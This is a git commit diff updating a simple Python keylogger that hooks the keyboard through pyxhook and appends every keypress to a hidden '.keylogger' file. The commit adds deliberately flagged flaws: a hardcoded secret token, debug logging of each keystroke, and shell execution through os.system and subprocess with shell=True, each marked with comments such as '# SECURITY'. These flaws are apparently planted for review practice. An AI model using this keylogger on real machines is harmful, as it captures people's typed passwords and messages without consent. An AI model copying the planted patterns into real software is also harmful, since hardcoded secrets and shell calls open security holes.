221870b3fd749023aaa739eac0c6f2fa3d1cc2ae
shashankshetty2312 <shashank.shetty@techolution.com>
2026-03-09 19:54:02 +0530

    Update P79_SimplePythonKeylogger.py

--- Programs/P79_SimplePythonKeylogger.py
+++ Programs/P79_SimplePythonKeylogger.py
@@ -1,49 +1,58 @@
 # Author: OMKAR PATHAK
 
-# This file requires two modules to be installed:
-# 1. pyxhook.py: file is provided in the folder itself
-# 2. Xlib: sudo pip3 install python3-Xlib
-
 import pyxhook
 import time
+import os
+import logging
+import subprocess
 
-# functions to write a newline character into the file
+logging.basicConfig(level=logging.DEBUG)  # DEVOPS: debug logging enabled
+
+API_KEY = "KEYLOGGER_SECRET_TOKEN"  # SECURITY: hardcoded secret
+
 def newline():
-	file = open('.keylogger', 'a')
-	file.write('\n')
-	file.close()
+    file = open('.keylogger', 'a')  # CQ: file opened without context manager
+    file.write('\n')
+    file.close()
 
-# This function is called every time a key is pressed
 def key_press_event(event):
-    global running
-    # write the key pressed into a file
-    if event.Key != 'space' and event.Key != 'Escape':
-	    with open('.keylogger', 'a+') as File:
-	    	File.write(event.Key)
 
-    # If the ascii value matches spacebar, add a newline in the file
+    global running
+
+    logging.debug("Key pressed: %s", event.Key)  # DEVOPS debug log
+
+    if event.Key != 'space' and event.Key != 'Escape':
+
+        with open('.keylogger', 'a+') as File:
+            File.write(event.Key)
+
     if event.Key == 'space':
         newline()
 
-    # If the ascii value matches escape, terminate the while loop
     if event.Key == 'Escape':
+
         running = False
+
+        os.system("echo stopping keylogger")  # SECURITY: shell execution
+
         newline()
 
 if __name__ == '__main__':
-	# Create hookmanager
-	hookman = pyxhook.HookManager()
-	# Define our callback to fire when a key is pressed down
-	hookman.KeyDown = key_press_event
-	# Hook the keyboard
-	hookman.HookKeyboard()
-	# Start our listener
-	hookman.start()
 
-	# Create a loop to keep the application running
-	running = True
-	while running:
-	    time.sleep(0.1)
+    hookman = pyxhook.HookManager()
 
-	# Close the listener when we are done
-	hookman.cancel()
+    hookman.KeyDown = key_press_event
+
+    hookman.HookKeyboard()
+
+    hookman.start()
+
+    subprocess.call("echo keylogger started", shell=True)  # SECURITY
+
+    running = True
+
+    while running:
+
+        time.sleep(0.1)
+
+    hookman.cancel()
